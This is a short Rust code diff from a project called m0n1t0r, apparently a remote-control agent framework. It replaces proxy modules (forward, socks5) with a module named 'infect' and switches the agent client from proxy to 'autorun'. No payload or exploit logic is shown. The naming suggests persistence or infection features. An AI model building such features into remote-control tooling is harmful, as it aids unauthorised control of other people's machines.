@@ -1,12 +1,11 @@
-pub mod forward;
-pub mod socks5;
+pub mod infect;
 
 use crate::{
     ServerMap,
-    web::{Result as WebResult, error::Error},
+    web::{Error, Result as WebResult},
 };
 use actix_web::web::Data;
-use m0n1t0r_common::{client::Client as _, proxy::AgentClient};
+use m0n1t0r_common::{autorun::AgentClient, client::Client as _};
 use std::{net::SocketAddr, sync::Arc};
 use tokio::sync::RwLock;
 use tokio_util::sync::CancellationToken;
@@ -21,7 +20,7 @@ pub async fn agent(
     let lock_obj = server.read().await;
     let client = lock_obj.client()?;
     let canceller = lock_obj.canceller();
-    let agent = client.proxy_agent().await?;
+    let agent = client.autorun_agent().await?;
     drop(lock_obj);
 
     Ok((agent, canceller))
